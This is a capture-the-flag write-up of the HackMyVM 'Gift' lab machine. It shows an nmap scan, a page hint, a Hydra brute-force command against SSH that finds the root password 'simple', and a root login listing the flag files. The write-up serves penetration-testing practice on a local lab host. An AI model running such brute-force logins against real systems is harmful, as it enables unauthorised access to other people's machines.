---
title: "HackMyVM-Gift"
date: 2025-04-19
categories: 
  - "hackmyvm"
tags: 
  - "hackmyvm"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Easy |

## Nmap

```
[root@kali] /home/kali  
❯ nmap 192.168.56.157 -sV -A -p- 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
```

目录扫描失败

```
[root@kali] /home/kali  
❯ curl "http://192.168.56.157/" -v  
*   Trying 192.168.56.157:80...
* Connected to 192.168.56.157 (192.168.56.157) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.56.157
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 19 Apr 2025 06:42:57 GMT
< Content-Type: text/html
< Content-Length: 57
< Last-Modified: Sun, 20 Sep 2020 16:29:39 GMT
< Connection: keep-alive
< ETag: "5f678373-39"
< Accept-Ranges: bytes
< 

Dont Overthink. Really, Its simple.
        <!-- Trust me -->

* Connection #0 to host 192.168.56.157 left intact
```

## Hydra to ssh

尝试使用**simple**爆破登录

发现**simple**不是用户名而是密码

```
[root@kali] /home/kali  
❯ hydra -L ./Desktop/fuzzDicts/userNameDict/user.txt  -p simple ssh://192.168.56.157 -I    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 14:45:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8886 login tries (l:8886/p:1), ~556 tries per task
[DATA] attacking ssh://192.168.56.157:22/
[22][ssh] host: 192.168.56.157   login: root   password: simple
```

登录拿到**flag**

```
[root@kali] /home/kali  
❯ ssh root@192.168.56.157  
The authenticity of host '192.168.56.157 (192.168.56.157)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.157' (ED25519) to the list of known hosts.
root@192.168.56.157's password: 
IM AN SSH SERVER
gift:~# whoami
root
gift:~# ls
root.txt  user.txt
```
